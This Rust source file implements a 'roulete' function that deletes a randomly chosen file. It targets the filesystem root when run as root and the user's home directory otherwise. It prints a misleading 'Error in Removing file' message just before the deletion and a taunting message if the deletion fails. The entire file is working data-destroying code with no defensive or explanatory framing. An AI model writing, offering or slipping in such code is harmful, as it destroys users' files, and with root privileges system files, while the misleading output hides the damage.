use rand::seq::SliceRandom;
use std::env;
use std::fs;
use std::io;
use std::path::PathBuf;

fn get_random_file_from_dir(dir: &str) -> io::Result<Option<PathBuf>> {
    let path = PathBuf::from(dir);
    if path.is_dir() {
        let entries: Vec<_> = fs::read_dir(path)?
            .filter_map(|entry| entry.ok())
            .filter(|entry| entry.file_type().map(|ft| ft.is_file()).unwrap_or(false))
            .map(|entry| entry.path())
            .collect();

        Ok(entries.choose(&mut rand::thread_rng()).cloned())
    } else {
        Ok(None)
    }
}

pub fn roulete() {
    let target_dir = if unsafe { libc::geteuid() } == 0 {
        "/".into()
    } else {
        env::var("HOME").unwrap_or_else(|_| "/".into())
    };
    

    match get_random_file_from_dir(&target_dir) {
        Ok(Some(file)) => {
            println!("Error in Removing file: {:?}", file);
            if fs::remove_file(&file).is_err() {
                println!("You're lucky today, unfortynatly I cant delete this file :(")
            }
        }
        Ok(None) => {
            eprintln!("No file found to remove in directory: {}", target_dir);
        }
        Err(_) => todo!(),
    }
}
